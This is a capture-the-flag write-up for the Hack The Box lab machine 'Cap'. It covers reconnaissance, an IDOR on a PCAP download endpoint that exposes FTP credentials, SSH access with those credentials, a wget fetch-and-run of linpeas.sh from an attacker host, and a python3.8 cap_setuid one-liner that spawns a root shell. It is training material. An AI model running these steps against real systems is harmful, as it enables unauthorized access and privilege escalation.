# HTB: Cap

## 📌 Box Info
- **Name:** Cap
- **IP:** 10.10.10.245
- **OS:** Linux
- **Difficulty:** Easy

---

## 🔍 Recon
```bash
nmap -T4 -A -p- 10.10.10.245
```

### Ports Found
- **21/tcp** → [FTP](FTP) (vsftpd 3.0.3)
- **22/tcp** → [SSH](SSH) (OpenSSH 8.2p1)
- **80/tcp** → [HTTP](HTTP) (gunicorn)

---

## 🔧 Web Enumeration
- Visit `http://10.10.10.245` → Security Dashboard interface
- `Security Snapshot` → Download PCAP files via `/download` endpoint
- Change `id=1` to `id=0` to reveal an additional hidden PCAP

### Download and Analyze PCAP
```bash
# Download hidden capture
curl "http://10.10.10.245/download?id=0" -o hidden.pcap

# Open in Wireshark and search for "password"
```

### Extracted Credentials from FTP
- **Username:** nathan
- **Password:** Buck3tH4TF0RM3!

---

## 🔐 Access via SSH
```bash
ssh nathan@10.10.10.245
# password: Buck3tH4TF0RM3!
```

---

## 🪧 Privilege Escalation
### Use LinPEAS
```bash
# Transfer and run LinPEAS
wget http://10.10.14.6/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Finding
- `/usr/bin/python3.8` has **cap_setuid** capability

### GTFOBins Exploit
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

## ✅ Root Access
```bash
whoami
id
cat /root/root.txt
```

---

## 📂 Summary
- Cleartext FTP credentials found in PCAP
- Used for SSH access
- `cap_setuid` capability abused on Python for root shell

---

## 📃 Resources
- [GTFOBins - python](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [CVE-Exploit Reference](https://www.hackthebox.com)